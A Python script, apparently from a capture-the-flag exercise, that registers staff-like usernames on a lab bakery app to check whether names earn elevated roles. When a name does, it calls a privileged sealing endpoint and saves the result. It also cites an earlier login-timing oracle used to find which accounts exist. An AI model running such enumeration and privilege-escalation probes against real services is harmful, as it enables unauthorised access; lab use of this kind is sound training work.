#!/usr/bin/env python3
"""Register names the app itself implies, and read the role it hands back.

`/register` answers `{ok, user, role}`, so any name-based seeding rule reports itself on the
first response - no guessing, no attack on anyone else's account. The login-timing oracle
already showed which staff-sounding names are ABSENT from the DB (flag1, xinspector,
chief_x, night_shift, senior_inspector, shift_lead, qa_lead, hr), i.e. free to register,
while chief/inspector/quality_inspector/admin/supervisor/foreman/ceo/founder/robot/the_chief/
head_chief are taken. If the seeder assigns a role by name pattern rather than as a fixed
row, or if it reserves a name that no one has claimed yet, this is the one place where that
shows up without touching another team's account.

Registering a name nobody has is not a credential attack: no existing row is involved, and
the only thing read back is the role the app chooses to give my own new user.
"""
import sys
import time

from cc import Client

NAMES = [
    "senior_inspector", "shift_lead", "qa_lead", "night_shift", "hr", "xinspector",
    "chief_x", "flag1", "inspector_zz", "inspectorz9", "zzinspector", "the_chief_zz",
    "chiefzz9", "head_chief_zz", "quality_inspector_zz", "robot_zz", "staff_zz",
    "auditor_zz", "foreman_zz", "supervisor_zz",
]

def log(*a):
    sys.stdout.buffer.write((" ".join(str(x) for x in a) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()

hits = []
for i, u in enumerate(NAMES):
    c = Client()
    code, out, dt = c.post("/register", {"username": u, "password": "zzPassw0rd!%d" % i})
    role = out.get("role") if isinstance(out, dict) else None
    log("%-20s register -> %-3s role=%-10s %s" % (u, code, role, str(out)[:70] if code != 200 else ""))
    if code == 200 and role != "baker":
        log("   !!! %s got role=%s" % (u, role))
        hits.append((u, c, role))
        code2, out2, _ = c.post("/api/recipe", {"title": "role test",
                                                "ingredients": [{"name": "flour", "value": "1"}]})
        rid = out2.get("id") if isinstance(out2, dict) else None
        if rid:
            sc, so, _ = c.post("/api/seal", {"recipeId": rid})
            log("   /api/seal -> %s %s" % (sc, str(so)[:120]))
            if sc == 200:
                open("../files/seal_as_%s.txt" % u, "w", encoding="utf-8").write(str(so))
    elif code == 409:
        log("   (name already taken - another team's account, left alone)")
    time.sleep(4.5)
log("roles that were not baker: %s" % [h[0] for h in hits])
